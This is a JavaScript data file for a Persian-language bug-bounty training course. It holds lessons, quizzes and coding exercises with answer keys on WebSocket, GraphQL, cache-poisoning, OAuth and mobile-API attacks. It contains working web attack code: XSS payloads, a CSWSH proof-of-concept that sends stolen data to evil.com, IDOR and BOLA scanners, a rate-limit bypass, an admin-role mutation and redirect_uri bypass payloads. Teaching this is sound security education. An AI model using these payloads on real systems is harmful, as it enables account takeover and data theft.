        steps: [
            { type: "teach", title: "حمله به WebSocket", content: `<p>WebSocket ها اغلب auth و validation ضعیف‌تری دارن:</p><pre><code>// اتصال به WebSocket:
const ws = new WebSocket('wss://target.com/ws');

ws.onopen = () => {
    console.log('[+] Connected');
    // تست injection
    ws.send(JSON.stringify({ type: 'message', text: '<script>alert(1)</script>' }));
};

ws.onmessage = (event) => {
    console.log('[*] Received:', event.data);
};

// مشکلات رایج:
// 1. بدون auth - هرکسی وصل میشه
// 2. بدون origin check - CSWSH
// 3. بدون input validation
// 4. اطلاعات حساس broadcast میشه

// Cross-Site WebSocket Hijacking (CSWSH):
// مثل CSRF ولی برای WebSocket
// اگه Origin header چک نشه، از سایت مهاجم وصل میشی</code></pre>` },
            { type: "quiz", title: "CSWSH چیه؟", options: ["XSS در WebSocket", "اتصال WebSocket از دامنه مهاجم بدون auth check", "DDoS WebSocket", "حذف WebSocket"], correct: 1 },
            { type: "teach", title: "تست WebSocket", content: `<pre><code>// اسکریپت تست WebSocket:
async function testWebSocket(wsUrl) {
    return new Promise((resolve) => {
        const ws = new WebSocket(wsUrl);
        const results = { connected: false, messages: [], errors: [] };

        ws.onopen = () => {
            results.connected = true;
            console.log('[+] WS Connected without auth!');

            // تست XSS
            ws.send(JSON.stringify({ message: '<img src=x onerror=alert(1)>' }));

            // تست IDOR - subscribe به channel دیگران
            ws.send(JSON.stringify({ type: 'subscribe', channel: 'admin' }));

            // تست injection
            ws.send(JSON.stringify({ type: 'query', data: '{"$gt":""}' }));
        };

        ws.onmessage = (e) => {
            results.messages.push(JSON.parse(e.data));
            console.log('[*] Got:', e.data);
        };

        ws.onerror = (e) => results.errors.push(e);

        setTimeout(() => { ws.close(); resolve(results); }, 5000);
    });
}

// CSWSH PoC page:
const cswshPoc = \`<html><body>
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action":"getProfile"}');
};
ws.onmessage = function(e) {
    // ارسال داده به سرور مهاجم
    fetch('https://evil.com/steal?data=' + btoa(e.data));
};
</script></body></html>\`;</code></pre>` },
            { type: "quiz", title: "چرا WebSocket ها اغلب آسیب‌پذیرترن؟", options: ["قدیمی‌ترن", "devها کمتر بهشون توجه امنیتی دارن", "رمزنگاری ندارن", "فقط HTTP هستن"], correct: 1 },
            { type: "code", title: "WebSocket تست کن!", instruction: "یه اتصال WebSocket بساز و یه پیام با payload XSS بفرست.", answer: 'const ws = new WebSocket("wss://target.com/ws"); ws.onopen = () => ws.send("<img src=x onerror=alert(1)>");', validate: function(code) { return code.includes('WebSocket') && code.includes('send'); } }
        ]
    },
    {
        id: 54,
        title: "باگ‌بانتی: GraphQL",
        icon: "◈",
        steps: [
            { type: "teach", title: "حمله به GraphQL", content: `<p>GraphQL endpoint ها اغلب introspection فعاله و auth ضعیفی دارن:</p><pre><code>// 1. Introspection - کشف کل schema:
const introspectionQuery = {
    query: \`{
        __schema {
            types {
                name
                fields {
                    name
                    type { name }
                }
            }
        }
    }\`
};

// 2. پیدا کردن endpoint:
// /graphql, /graphiql, /api/graphql, /v1/graphql

// 3. مشکلات رایج:
// - Introspection فعال در production
// - بدون rate limit (query پیچیده = DoS)
// - بدون depth limit (nested queries)
// - IDOR در queries
// - Mutation بدون auth</code></pre>` },
            { type: "quiz", title: "Introspection در GraphQL چیه؟", options: ["یه حمله", "قابلیت کشف schema کامل API", "debugging", "یه نوع error"], correct: 1 },
            { type: "teach", title: "Exploitation", content: `<pre><code>// اسکریپت تست GraphQL:
async function testGraphQL(url) {
    // 1. Introspection
    const schema = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            query: '{ __schema { queryType { fields { name } } mutationType { fields { name } } } }'
        })
    }).then(r => r.json());
    console.log('[+] Schema:', schema);

    // 2. تست IDOR
    const idor = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            query: '{ user(id: 1) { email password } }'
        })
    }).then(r => r.json());
    console.log('[+] IDOR test:', idor);

    // 3. Batch query (bypass rate limit)
    const batch = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify([
            { query: '{ user(id: 1) { email } }' },
            { query: '{ user(id: 2) { email } }' },
            { query: '{ user(id: 3) { email } }' },
        ])
    }).then(r => r.json());

    // 4. DoS via nested query
    const dos = { query: '{ users { friends { friends { friends { name } } } } }' };
}

// Mutation abuse:
const adminMutation = {
    query: \`mutation {
        updateUser(id: 1, input: { role: "admin" }) {
            id role
        }
    }\`
};</code></pre>` },
            { type: "quiz", title: "Batch query چطور rate limit رو bypass می‌کنه؟", options: ["نمی‌کنه", "چند query در یه HTTP request → یه request حساب میشه", "سریع‌تره", "IP عوض می‌کنه"], correct: 1 },
            { type: "code", title: "GraphQL introspection بنویس!", instruction: "یه fetch بنویس که schema کامل GraphQL رو با introspection بگیره.", answer: 'fetch("/graphql", { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({query:"{ __schema { types { name } } }"}) });', validate: function(code) { return code.includes('__schema') && code.includes('fetch') && code.includes('graphql'); } }
        ]
    },
    {
        id: 55,
        title: "باگ‌بانتی: Cache Poisoning",
        icon: "💊",
        steps: [
            { type: "teach", title: "Web Cache Poisoning", content: `<p>وقتی CDN/Cache محتوای سمی رو ذخیره و به بقیه سرو کنه:</p><pre><code>// سناریو: سایت از X-Forwarded-Host در response استفاده می‌کنه
// و CDN اون response رو cache می‌کنه

// درخواست مهاجم:
// GET / HTTP/1.1
// Host: target.com
// X-Forwarded-Host: evil.com
//
// Response: <script src="https://evil.com/xss.js"></script>
// → CDN این رو cache می‌کنه!
// → بقیه کاربرا هم این JS مخرب رو دریافت می‌کنن

// Headerهای قابل سوءاستفاده:
// X-Forwarded-Host
// X-Forwarded-Scheme
// X-Original-URL
// X-Rewrite-URL

// تشخیص cache:
// - header های response: Age, X-Cache, CF-Cache-Status
// - اضافه کردن cache buster: ?cb=123</code></pre>` },
            { type: "quiz", title: "Cache poisoning چطور کار می‌کنه؟", options: ["Cache رو حذف می‌کنه", "محتوای مخرب رو cache می‌کنه و به همه سرو میشه", "سرور رو هک می‌کنه", "DNS رو عوض می‌کنه"], correct: 1 },
            { type: "teach", title: "تست Cache Poisoning", content: `<pre><code>// اسکریپت تست:
async function testCachePoisoning(url) {
    const headers = [
        'X-Forwarded-Host',
        'X-Forwarded-Scheme',
        'X-Original-URL',
        'X-Rewrite-URL',
        'X-Forwarded-Port',
        'X-Host',
    ];

    for (const header of headers) {
        // با cache buster تست کن تا سایت رو خراب نکنی
        const testUrl = url + '?cb=' + Math.random();
        const res = await fetch(testUrl, {
            headers: { [header]: 'evil.com' }
        });
        const body = await res.text();
        const cacheStatus = res.headers.get('X-Cache') || res.headers.get('CF-Cache-Status');

        if (body.includes('evil.com')) {
            console.log('[!] Reflected:', header);
            console.log('[*] Cache status:', cacheStatus);
            // اگه cache status = HIT → poisoned!
        }
    }
}

// HTTP Request Smuggling (مرتبط):
// وقتی front-end و back-end طول request رو متفاوت تفسیر می‌کنن
// Content-Length vs Transfer-Encoding: chunked
// → می‌تونی request بعدی رو manipulate کنی</code></pre>` },
            { type: "quiz", title: "چرا cache buster استفاده می‌کنیم؟", options: ["سریع‌تر بشه", "سایت اصلی رو خراب نکنیم", "bypass auth", "حذف cache"], correct: 1 },
            { type: "code", title: "Cache test بنویس!", instruction: "یه fetch با header <code>X-Forwarded-Host: evil.com</code> بفرست و چک کن reflect شده.", answer: 'fetch(url+"?cb="+Math.random(), { headers: {"X-Forwarded-Host":"evil.com"} }).then(r=>r.text()).then(b=>console.log(b.includes("evil.com")));', validate: function(code) { return code.includes('X-Forwarded') && code.includes('fetch'); } }
        ]
    },
    {
        id: 56,
        title: "باگ‌بانتی: OAuth و SSO",
        icon: "🔑",
        steps: [
            { type: "teach", title: "آسیب‌پذیری OAuth", content: `<p>OAuth flow مراحل زیادی داره و هر مرحله ممکنه باگ داشته باشه:</p><pre><code>// OAuth2 Flow:
// 1. User → App: "Login with Google"
// 2. App → Google: redirect با client_id + redirect_uri
// 3. Google → User: consent screen
// 4. Google → App: redirect با authorization code
// 5. App → Google: exchange code for token
// 6. App → User: logged in!

// باگ‌های رایج:

// 1. Open Redirect در redirect_uri:
// /authorize?redirect_uri=https://evil.com
// → code به سایت مهاجم میره!

// 2. redirect_uri validation ضعیف:
// https://app.com/callback → OK
// https://app.com.evil.com/callback → bypass!
// https://app.com/callback/../evil → bypass!

// 3. state parameter نداره:
// → CSRF در OAuth (اکانت مهاجم لینک میشه)

// 4. token در URL fragment:
// → Referer header لو میده</code></pre>` },
            { type: "quiz", title: "state parameter در OAuth چیکار می‌کنه؟", options: ["session ذخیره می‌کنه", "CSRF جلوگیری می‌کنه", "token رو رمز می‌کنه", "user رو verify می‌کنه"], correct: 1 },
            { type: "teach", title: "تست OAuth", content: `<pre><code>// تکنیک‌های تست:

// 1. redirect_uri manipulation:
const payloads = [
    'https://evil.com',
    'https://app.com@evil.com',
    'https://app.com%40evil.com',
    'https://app.com/callback/../../evil',
    'https://app.com/callback?next=https://evil.com',
    'https://app.com/callback#@evil.com',
];

// 2. Account takeover via OAuth linking:
// اگه بتونی OAuth account خودت رو به victim لینک کنی
// مراحل:
// a. CSRF: لینک OAuth خودت رو به victim بفرست
// b. victim کلیک می‌کنه → اکانت OAuth تو لینک میشه
// c. حالا با OAuth خودت وارد اکانت victim میشی

// 3. Race condition در code exchange:
// code رو دو بار استفاده کن (باید reject بشه)
async function testCodeReuse(tokenUrl, code) {
    const results = await Promise.all([
        fetch(tokenUrl, { method: 'POST', body: new URLSearchParams({ code, grant_type: 'authorization_code' }) }),
        fetch(tokenUrl, { method: 'POST', body: new URLSearchParams({ code, grant_type: 'authorization_code' }) }),
    ]);
    // اگه هر دو 200 برگردونن = باگ!
}

// 4. Scope escalation:
// scope=read → scope=read+write+admin</code></pre>` },
            { type: "quiz", title: "اگه redirect_uri به evil.com اشاره کنه چی میشه؟", options: ["کاری نمی‌کنه", "authorization code به مهاجم میره → account takeover", "token منقضی میشه", "خطا میده"], correct: 1 },
            { type: "code", title: "OAuth redirect test!", instruction: "چند redirect_uri payload برای bypass بنویس.", answer: 'const payloads = ["https://evil.com", "https://app.com@evil.com", "https://app.com/cb/../../../evil"];', validate: function(code) { return code.includes('evil') && code.includes('redirect') || code.includes('payloads'); } }
        ]
    },
    {
        id: 57,
        title: "باگ‌بانتی: Mobile API",
        icon: "📱",
        steps: [
            { type: "teach", title: "آسیب‌پذیری API موبایل", content: `<p>API هایی که برای اپ موبایل ساخته شدن اغلب امنیت کمتری دارن:</p><pre><code>// چرا Mobile API ها جالبن:
// 1. dev ها فکر می‌کنن "کسی نمی‌بینه"
// 2. endpoint های مخفی و undocumented
// 3. auth ضعیف‌تر
// 4. verbose error messages
// 5. hardcoded API keys در APK

// پیدا کردن endpoint:
// 1. Decompile APK (jadx, apktool)
// 2. Proxy traffic (Burp + SSL pinning bypass)
// 3. Strings extraction:
//    strings app.apk | grep -i "api\|http\|key\|secret"

// مثال endpoint های مخفی:
// /api/v1/admin/users (admin panel API)
// /api/internal/debug
// /api/v2/users (new version, less secure)

// Hardcoded secrets in JS/React Native:
// bundle.js, index.android.bundle
// اغلب API key, Firebase config, AWS credentials</code></pre>` },
            { type: "quiz", title: "چرا Mobile API ها اغلب آسیب‌پذیرترن؟", options: ["موبایل ضعیف‌تره", "dev ها فکر می‌کنن کسی endpoint ها رو نمی‌بینه", "HTTPS ندارن", "فقط iOS"], correct: 1 },
            { type: "teach", title: "تست API موبایل", content: `<pre><code>// اسکریپت Fuzzing API versions:
async function fuzzAPIVersions(baseUrl, token) {
    const versions = ['v1', 'v2', 'v3', 'v4', 'internal', 'admin', 'debug', 'test'];
    const endpoints = ['users', 'profile', 'settings', 'config', 'debug', 'admin'];

    for (const ver of versions) {
        for (const ep of endpoints) {
            const url = baseUrl + '/api/' + ver + '/' + ep;
            try {
                const res = await fetch(url, {
                    headers: { 'Authorization': 'Bearer ' + token }
                });
                if (res.status !== 404) {
                    console.log('[+]', url, '->', res.status);
                }
            } catch(e) {}
        }
    }
}

// Header manipulation - اغلب Mobile API ها:
const mobileHeaders = {
    'X-API-Key': 'extracted-from-apk',
    'X-App-Version': '1.0.0',
    'X-Device-ID': 'manipulated-id',
    'X-Platform': 'android',
    'User-Agent': 'okhttp/4.9.0', // Android app
};

// تست broken object level auth:
// Mobile API اغلب BOLA (IDOR) داره
async function testBOLA(baseUrl, token) {
    // user خودت id=5 ه
    for (let id = 1; id <= 20; id++) {
        const res = await fetch(baseUrl + '/api/v1/users/' + id + '/private-data', {
            headers: { 'Authorization': 'Bearer ' + token, ...mobileHeaders }
        });
        if (res.ok) console.log('[!] BOLA - can access user', id);
    }
}</code></pre>` },
            { type: "quiz", title: "BOLA در OWASP API Top 10 چیه؟", options: ["Broken Authentication", "Broken Object Level Authorization (= IDOR)", "Buffer Overflow", "Broken Link"], correct: 1 },
            { type: "code", title: "API version fuzz بنویس!", instruction: "اسکریپتی بنویس که /api/v1 تا /api/v5 رو با endpoint users تست کنه.", answer: 'for(let i=1;i<=5;i++){fetch("/api/v"+i+"/users").then(r=>{if(r.status!==404)console.log("Found: v"+i,r.status)})}', validate: function(code) { return code.includes('for') && code.includes('/api/v') && code.includes('fetch'); } }
        ]
    },
    {
        id: 58,
        title: "باگ‌بانتی: Automation",
        icon: "🤖",
        steps: [
            { type: "teach", title: "اتوماسیون Recon", content: `<p>ابزار خودکار برای پوشش بیشتر سطح حمله:</p><pre><code>// Pipeline اتوماسیون باگ‌بانتی:

// 1. Subdomain discovery
// subfinder -d target.com | httpx | nuclei

// 2. اسکریپت Node.js برای recon کامل:
const { execSync } = require('child_process');
const fs = require('fs');

class BugBountyAutomation {
    constructor(domain) {
        this.domain = domain;
        this.results = { subdomains: [], alive: [], vulns: [] };
    }

    // جمع‌آوری subdomain از منابع مختلف
    async findSubdomains() {
        const sources = [
            \`https://crt.sh/?q=%25.\${this.domain}&output=json\`,
            \`https://api.hackertarget.com/hostsearch/?q=\${this.domain}\`,
        ];

        for (const url of sources) {
            try {
                const res = await fetch(url);
                const data = await res.json();
                // parse and collect...
            } catch(e) {}
        }
    }

    // چک زنده بودن
    async checkAlive() {
        for (const sub of this.results.subdomains) {
            try {
                const res = await fetch('https://' + sub, {
                    signal: AbortSignal.timeout(5000)
                });
                this.results.alive.push({
                    sub,
                    status: res.status,
                    server: res.headers.get('server'),
                    tech: this.detectTech(res)
                });
            } catch(e) {}
        }
    }

    detectTech(res) {
        const headers = Object.fromEntries(res.headers);
        const techs = [];
        if (headers['x-powered-by']) techs.push(headers['x-powered-by']);
        if (headers['server']) techs.push(headers['server']);
        return techs;
    }
}</code></pre>` },
            { type: "quiz", title: "چرا اتوماسیون در باگ‌بانتی مهمه؟", options: ["لازم نیست", "سطح حمله بزرگه و دستی نمیشه همه رو بررسی کرد", "شرکت‌ها دوست دارن", "فقط حرفه‌ای‌ها"], correct: 1 },
            { type: "teach", title: "Nuclei Templates", content: `<pre><code>// Nuclei: اسکنر آسیب‌پذیری قالب‌محور
// نصب: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

// اجرا:
// nuclei -u https://target.com -t cves/
// nuclei -l urls.txt -t exposures/

// ساخت template سفارشی:
// my-template.yaml
/*
id: custom-api-key-disclosure
info:
  name: API Key in JavaScript
  severity: medium

requests:
  - method: GET
    path:
      - "{{BaseURL}}/static/js/main.js"
      - "{{BaseURL}}/bundle.js"
    matchers:
      - type: regex
        regex:
          - 'AKIA[0-9A-Z]{16}'
          - 'AIza[0-9A-Za-z_-]{35}'
*/

// اتوماسیون کامل با cron:
// هر روز subdomain جدید پیدا کن
// هر هفته nuclei scan بزن
// نتایج جدید رو Slack/Telegram اطلاع بده

// Notify script:
async function notify(message) {
    await fetch(process.env.TELEGRAM_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: process.env.CHAT_ID,
            text: message
        })
    });
}</code></pre>` },
            { type: "quiz", title: "Nuclei چیه؟", options: ["زبان برنامه‌نویسی", "اسکنر آسیب‌پذیری با template", "دیتابیس", "CDN"], correct: 1 },
            { type: "code", title: "Automation class بنویس!", instruction: "یه class بنویس که domain بگیره و متد <code>findSubdomains</code> داشته باشه که از crt.sh استفاده کنه.", answer: 'class Recon { constructor(d){this.domain=d;} async findSubdomains(){ const r=await fetch("https://crt.sh/?q=%25."+this.domain+"&output=json"); return r.json(); } }', validate: function(code) { return code.includes('class') && code.includes('crt.sh') && code.includes('fetch'); } }
        ]
    }
];
